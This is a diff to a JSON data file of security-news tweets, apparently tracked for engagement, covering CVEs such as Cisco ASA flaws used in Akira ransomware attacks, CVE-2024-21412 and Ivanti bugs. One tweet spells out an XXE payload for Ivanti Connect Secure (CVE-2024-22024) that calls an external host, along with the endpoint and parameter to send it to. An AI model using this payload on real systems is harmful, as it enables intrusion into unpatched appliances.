@@ -36,6 +36,19 @@
 }
 {
     "expanded_url": [
+        "https://thehackernews.com/2024/02/cisa-warning-akira-ransomware.html"
+    ],
+    "tweetfavorites": 200,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 99,
+    "tweettext": "⚠️ CISA warns of hackers exploiting a security flaw (CVE-2020-3259) in #Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD) software in Akira #ransomware attacks.\n\nLearn more: https://t.co/l8tqH34IrZ\n\n#cybersecurity #hacking #malware",
+    "tweettime": "2024-02-16, 15:46:35",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1758518243227037773",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
         "https://securityonline.info/poc-exploit-released-for-microsoft-outlook-rce-flaw-cve-2024-21413/"
     ],
     "tweetfavorites": 328,
@@ -213,20 +226,20 @@
         "https://bit.ly/3P5rhkb",
         "https://bit.ly/3HYNqfR"
     ],
-    "tweetfavorites": 78,
+    "tweetfavorites": 95,
     "tweetquotes": 0,
-    "tweetreplies": 1,
-    "tweetretweets": 28,
+    "tweetreplies": 2,
+    "tweetretweets": 32,
     "tweettext": "CVE-2024-21412 is an active zero-day vulnerability that was disclosed by Trend Micro's @thezdi to Microsoft &amp; published today. Trend customers are protected; organizations should take immediate action. Video below &amp; more info: https://t.co/yyQ7uRoDDL https://t.co/RBNKbLUSwU",
     "tweettime": "2024-02-13, 19:23:14",
     "tweeturl": "https://twitter.com/TrendMicro/status/1757485603195654385",
     "username": "TrendMicro"
 }
 {
-    "tweetfavorites": 78,
+    "tweetfavorites": 93,
     "tweetquotes": 1,
     "tweetreplies": 1,
-    "tweetretweets": 22,
+    "tweetretweets": 25,
     "tweettext": "APT GROUP WATER HYDRA EXPLOITS CVE-2024-21412 VULNERABILITY IN ZERO-DAY ATTACK\n\nEarlier today, Microsoft released a patch for CVE-2024-21412, a previously unknown vulnerability in Microsoft’s Windows Defender SmartScreen that allowed threat actors to bypass its security features… https://t.co/2T14kk61DL",
     "tweettime": "2024-02-13, 19:15:01",
     "tweeturl": "https://twitter.com/TrendMicroRSRCH/status/1757483531494719725",
@@ -397,7 +410,7 @@
     "expanded_url": [
         "https://github.com/0dteam/CVE-2024-22024"
     ],
-    "tweetfavorites": 115,
+    "tweetfavorites": 113,
     "tweetquotes": 0,
     "tweetreplies": 2,
     "tweetretweets": 49,
@@ -516,10 +529,10 @@
     "username": "piedpiper1616"
 }
 {
-    "tweetfavorites": 558,
+    "tweetfavorites": 570,
     "tweetquotes": 1,
     "tweetreplies": 3,
-    "tweetretweets": 130,
+    "tweetretweets": 134,
     "tweettext": "CVE-2024-22024,  XXE on Ivanti Connect Secure\n\npayload encoded base64:\n\n&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % xxe SYSTEM \"http://{{external-host}}/x\"&gt; %xxe;]&gt;&lt;r&gt;&lt;/r&gt;\n\nsend it to  127.0.0.1/dana-na/auth/saml-sso.cgi with SAMLRequest parm\n\n#bugbountytips #cve #Ivanti https://t.co/ShIkDghTU0",
     "tweettime": "2024-02-09, 07:03:25",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1755849867149103106",
